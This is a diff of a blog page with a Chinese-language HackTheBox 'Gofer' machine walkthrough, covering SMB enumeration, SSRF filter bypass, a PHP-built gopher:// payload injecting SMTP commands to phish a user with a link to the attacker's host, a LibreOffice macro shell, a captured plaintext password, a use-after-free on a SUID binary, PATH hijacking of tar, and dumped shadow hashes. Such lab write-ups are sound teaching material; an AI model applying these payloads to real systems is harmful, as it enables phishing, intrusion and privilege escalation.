@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Gofer 10.10.11.225   端口扫描22,80,开了smb的Linux，还有被过滤的25: 1234567891011121314151617181920212223242526272829$ nmap -sC -sV -Pn 10.10.11.225Starting Nmap 7.94 ( https">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Gofer 10.10.11.225                                                                                                              端口扫描22,80,开了smb的Linux，还有被过滤的25:">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Gofer - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2023/07/31/Gofer-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Gofer 10.10.11.225   端口扫描22,80,开了smb的Linux，还有被过滤的25: 1234567891011121314151617181920212223242526272829$ nmap -sC -sV -Pn 10.10.11.225Starting Nmap 7.94 ( https">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Gofer 10.10.11.225                                                                                                              端口扫描22,80,开了smb的Linux，还有被过滤的25:">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073101.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073102.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073103.jpg">
@@ -146,7 +146,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -235,7 +235,14 @@
 <li><a href="https://app.hackthebox.com/machines/Gofer" target="_blank" rel="noopener">https://app.hackthebox.com/machines/Gofer</a></li>
 <li>10.10.11.225</li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073101.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073101.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>22,80,开了smb的Linux，还有被过滤的25:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV -Pn 10.10.11.225</span></span><br><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-31 13:37 CST</span><br><span class="line">Nmap scan report for 10.10.11.225</span><br><span class="line">Host is up (0.13s latency).</span><br><span class="line">Not shown: 995 closed tcp ports (conn-refused)</span><br><span class="line">PORT    STATE    SERVICE     VERSION</span><br><span class="line">22/tcp  open     ssh         OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 aa:25:82:6e:b8:04:b6:a9:a9:5e:1a:91:f0:94:51:dd (RSA)</span><br><span class="line">|   256 18:21:ba:a7:dc:e4:4f:60:d7:81:03:9a:5d:c2:e5:96 (ECDSA)</span><br><span class="line">|_  256 a4:2d:0d:45:13:2a:9e:7f:86:7a:f6:f7:78:bc:42:d9 (ED25519)</span><br><span class="line">25/tcp  filtered smtp</span><br><span class="line">80/tcp  open     http        Apache httpd 2.4.56</span><br><span class="line">|_http-server-header: Apache/2.4.56 (Debian)</span><br><span class="line">|_http-title: Did not follow redirect to http://gofer.htb/</span><br><span class="line">139/tcp open     netbios-ssn Samba smbd 4.6.2</span><br><span class="line">445/tcp open     netbios-ssn Samba smbd 4.6.2</span><br><span class="line">Service Info: Host: gofer.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3:1:1:</span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2023-07-31T05:39:01</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 98.02 seconds</span><br></pre></td></tr></table></figure>
 
@@ -244,11 +251,25 @@
 <h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>需要加hosts：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.225 gofer.htb</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073102.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073102.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h1><p>smb匿名访问，backup里得到一个mail:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ~/Tools/impacket/examples/smbclient.py miao@10.10.11.225 -no-pass</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073103.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073103.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>查看邮件内容，提到Jocelyn容易被邮件钓鱼,libreoffice odt格式，并且提到网络代理现在正在做限制访问</p>
 <h2 id="mail"><a href="#mail" class="headerlink" title="mail"></a>mail</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">From jdavis@gofer.htb  Fri Oct 28 20:29:30 2022</span><br><span class="line">Return-Path: &lt;jdavis@gofer.htb&gt;</span><br><span class="line">X-Original-To: tbuckley@gofer.htb</span><br><span class="line">Delivered-To: tbuckley@gofer.htb</span><br><span class="line">Received: from gofer.htb (localhost [127.0.0.1])</span><br><span class="line">        by gofer.htb (Postfix) with SMTP id C8F7461827</span><br><span class="line">        for &lt;tbuckley@gofer.htb&gt;; Fri, 28 Oct 2022 20:28:43 +0100 (BST)</span><br><span class="line">Subject:Important to read!</span><br><span class="line">Message-Id: &lt;20221028192857.C8F7461827@gofer.htb&gt;</span><br><span class="line">Date: Fri, 28 Oct 2022 20:28:43 +0100 (BST)</span><br><span class="line">From: jdavis@gofer.htb</span><br><span class="line"></span><br><span class="line">Hello guys,</span><br><span class="line"></span><br><span class="line">Our dear Jocelyn received another phishing attempt last week and his habit of clicking on links without paying much attention may be problematic one day. That&#39;s why from now on, I&#39;ve decided that important documents will only be sent internally, by mail, which should greatly limit the risks. If possible, use an .odt format, as documents saved in Office Word are not always well interpreted by Libreoffice.</span><br><span class="line"></span><br><span class="line">PS: Last thing for Tom; I know you&#39;re working on our web proxy but if you could restrict access, it will be more secure until you have finished it. It seems to me that it should be possible to do so via &lt;Limit&gt;</span><br></pre></td></tr></table></figure>
 
@@ -256,21 +277,77 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://gofer.htb/" -H 'Host: FUZZ.gofer.htb' -fw 20</span><br><span class="line"></span><br><span class="line">[Status: 401, Size: 462, Words: 42, Lines: 15, Duration: 165ms]</span><br><span class="line">    * FUZZ: proxy</span><br></pre></td></tr></table></figure>
 
 <h1 id="proxy"><a href="#proxy" class="headerlink" title="proxy"></a>proxy</h1><p>添加hosts，直接访问是401，但根据前面邮件内容，限制访问是正在做，那就是还没完成，直接POST请求可以得到缺少url参数信息(小细节,post根目录还是401，/index.php才能得到信息):</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073104.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073105.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073104.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073105.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="url-ssrf"><a href="#url-ssrf" class="headerlink" title="url ssrf"></a>url ssrf</h2><p>添加url测试，确认存在SSRF:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073106.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073107.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073106.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073107.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h2><p>url参数还存在一些过滤,例如file协议和127，file协议可以简单的绕过：</p>
 <ul>
 <li>SSRF Cheat Sheet &amp; Bypass Techniques<br><a href="https://highon.coffee/blog/ssrf-cheat-sheet/" target="_blank" rel="noopener">https://highon.coffee/blog/ssrf-cheat-sheet/</a></li>
 <li>SSRF (Server Side Request Forgery) - HackTricks<br><a href="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery" target="_blank" rel="noopener">https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery</a></li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073108.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073109.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073108.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073109.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>127 ip过滤也可以通过简单的进制转换绕过：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073110.jpg" alt=""> </p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073111.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073110.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure> 
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073111.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="SSRF-SMTP"><a href="#SSRF-SMTP" class="headerlink" title="SSRF SMTP"></a>SSRF SMTP</h1><p>根据已有信息，重点是前面邮件里提到的钓鱼和内部邮件，SMTP外部被过滤但可以内部访问，那就可以通过SSRF来通过gopher协议和SMTP交互发邮件：</p>
 <ul>
 <li>Server-Side Request Forgery to Internal SMTP Access | by Muh. Fani Akbar | InfoSec Write-ups<br><a href="https://infosecwriteups.com/server-side-request-forgery-to-internal-smtp-access-dea16fe37ed2" target="_blank" rel="noopener">https://infosecwriteups.com/server-side-request-forgery-to-internal-smtp-access-dea16fe37ed2</a></li>
@@ -278,8 +355,24 @@
 <li>Web-Application-Attack/other-vulnerability/service-side-request-forgery/ssrf-and-smtp.md at master · rhamaa/Web-Application-Attack<br><a href="https://github.com/rhamaa/Web-Application-Attack/blob/master/other-vulnerability/service-side-request-forgery/ssrf-and-smtp.md" target="_blank" rel="noopener">https://github.com/rhamaa/Web-Application-Attack/blob/master/other-vulnerability/service-side-request-forgery/ssrf-and-smtp.md</a></li>
 </ul>
 <p>钓鱼目标用户根据前面邮件知道是Jocelyn，然后根据主站team页面中的全名和邮件中邮箱格式知道Jocelyn的邮件地址是<code>Jhudson@gofer.htb</code></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073112.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073113.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073112.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073113.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+
+
 <h2 id="ssrf-php"><a href="#ssrf-php" class="headerlink" title="ssrf.php"></a>ssrf.php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        $commands = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">'HELO gofer.htb'</span>,</span><br><span class="line">                <span class="string">'MAIL FROM: &lt;miao@miao.com&gt;'</span>,</span><br><span class="line">                <span class="string">'RCPT TO: &lt;Jhudson@gofer.htb&gt;'</span>,</span><br><span class="line">                <span class="string">'DATA'</span>,</span><br><span class="line">                <span class="string">'Subject: SSRF HERE'</span>,</span><br><span class="line">                <span class="string">'http://10.10.14.6:7777/test_miao'</span>,</span><br><span class="line">                <span class="string">'.'</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        $payload = implode(<span class="string">'%0A'</span>, $commands); <span class="comment">// memisahkan tiap command dengan newline</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> urlencode(<span class="string">'gopher://0x7f000001:25/_'</span> . $payload);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <h1 id="libreoffice-to-shell"><a href="#libreoffice-to-shell" class="headerlink" title="libreoffice to shell"></a>libreoffice to shell</h1><p>现在可以成功钓鱼让目标用户点击我们发送的链接，下一步就是具体利用了，根据前面信息知道用的libreoffice，需要odt格式：</p>
@@ -288,18 +381,60 @@
 <li>Using Malicious LibreOffice Calc Macros to Target Linux<br><a href="https://jamesonhacking.blogspot.com/2022/03/using-malicious-libreoffice-calc-macros.html" target="_blank" rel="noopener">https://jamesonhacking.blogspot.com/2022/03/using-malicious-libreoffice-calc-macros.html</a></li>
 </ul>
 <p>参考上面的文章手动编辑分配宏，区别就是文章用的表格，odt需要是文档。制作完之后同样的发送钓鱼，得到jhudson：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073114.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073115.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073114.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073115.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>jhudson用户目录得到user.txt:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073116.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073116.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h1><p>查看home目录发现后还有其他几个用户,运行pspy发现定时运行的curl，其中得到tbuckley账号密码：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2023/07/31 08:25:01 CMD: UID=0    PID=34951  | /usr/bin/curl http://proxy.gofer.htb/?url=http://gofer.htb --user tbuckley:ooP4dietie3o_hquaeti</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073117.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073117.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>tbuckley可以ssh登录,继续枚举，发现/usr/local/bin/notes有suid，dev组可以执行，而当前用户tbuckley在dev组：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073118.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073118.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="notes"><a href="#notes" class="headerlink" title="notes"></a>notes</h1><p>直接运行是一堆选项：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073119.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073119.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>下载到本地分析：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp tbuckley@10.10.11.225:/usr/local/bin/notes .</span><br></pre></td></tr></table></figure>
 
@@ -310,15 +445,50 @@
 <h2 id="user"><a href="#user" class="headerlink" title="user"></a>user</h2><p>选项1 创建用户会通过malloc分配40个字节，前24是用户名，后16是角色,如果运行这个程序的是root，角色是admin，否则是user：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> -e <span class="string">"\x69\x6d\x64\x61"</span></span></span><br><span class="line">imda</span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> -e <span class="string">"\x6e"</span></span></span><br><span class="line">n</span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> -e <span class="string">"\x72\x65\x73\x75"</span></span></span><br><span class="line">resu</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073120.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073120.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>选项2 就是show user info：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073121.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073121.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>选项3 删除用户，只是free，没有清空(重点):</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073122.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073122.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="notes-1"><a href="#notes-1" class="headerlink" title="notes"></a>notes</h2><p>选项4 创建笔记也是通过malloc申请40字节内存，和前面user申请的大小一样(也是重点)，选项5就是显示创建的笔记，选项6还没实现，选项7是删除：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073123.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073123.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h2><p>选项8是backup，首先判断用户是否是admin，通过后使用tar进行备份，注意tar没有指定绝对路径：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073124.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073124.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="提权-amp-root-flag"><a href="#提权-amp-root-flag" class="headerlink" title="提权 &amp; root flag"></a>提权 &amp; root flag</h1><p>分两部分，第一部分是利用UAF成为admin，第二部分是backup劫持tar</p>
 <h2 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h2><p>所以二进制利用就是类似UAF的方式,因为user和note的size相同,user被释放后note再申请相同size的内存，得到的是同一地址，整个流程大概这样:</p>
 <ul>
@@ -331,17 +501,45 @@
 <li>使用这个，我们可以写入我们的第一个指针仍然指向的内存，并使用如下注释修改用户角色(24个A)：AAAAAAAAAAAAAAAAAAAAAAAAadmin</li>
 <li>现在可以调用 show user info 来确认这一点，</li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073125.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073125.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="backup-1"><a href="#backup-1" class="headerlink" title="backup"></a>backup</h2><p>然后可以使用backup来运行tar，因为tar没有使用绝对路径，基础的路径劫持:</p>
 <ul>
 <li>Hijacking Relative Paths in SUID Programs | by Nairuz Abulhul | R3d Buck3T | Medium<br><a href="https://medium.com/r3d-buck3t/hijacking-relative-paths-in-suid-programs-fed804694e6e" target="_blank" rel="noopener">https://medium.com/r3d-buck3t/hijacking-relative-paths-in-suid-programs-fed804694e6e</a></li>
 </ul>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH&#x3D;&#x2F;tmp&#x2F;miao:$PATH</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073127.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073126.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073127.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073126.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h2><p>我们的命令被成功执行：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073128.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073128.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="shadow"><a href="#shadow" class="headerlink" title="shadow"></a>shadow</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root:$y$j9T$nDuW.3vSoMpbgISVomFz40$s8PL3BYhQ5HJINwYWlXvYKi9NnEt5KpMXlf3O0jHSx4:19473:0:99999:7:::</span><br><span class="line">jhudson:$y$j9T$O6XZVpGdd39Y3B0Qp9CY61$.yB.uWO1PxZdDWfWB6iMqeGv63HMQXM.uQIfVo0TfQ7:19299:0:99999:7:::</span><br><span class="line">jdavis:$y$j9T$MWpAazKnpmOMo4DbZ9J40.$&#x2F;lsXfhbM1t&#x2F;kBxFQ7x1EVyJqKBSnnVfyUMtqjk8hYH3:19299:0:99999:7:::</span><br><span class="line">tbuckley:$y$j9T$lgIfer5W5WyVWLfwzpDlu0$xpToiOURzOsTVzfgX6sgl1dNzqq7334cGlzKNm.h7T9:19299:0:99999:7:::</span><br><span class="line">ablake:$y$j9T$bLmJdnLApO3jfWtDGHpi60$1lLmLhhfVRQeXUDOssZ2YP46pXPg0rWWrUCaE7LlDTA:19299:0:99999:7:::</span><br></pre></td></tr></table></figure>
 
 
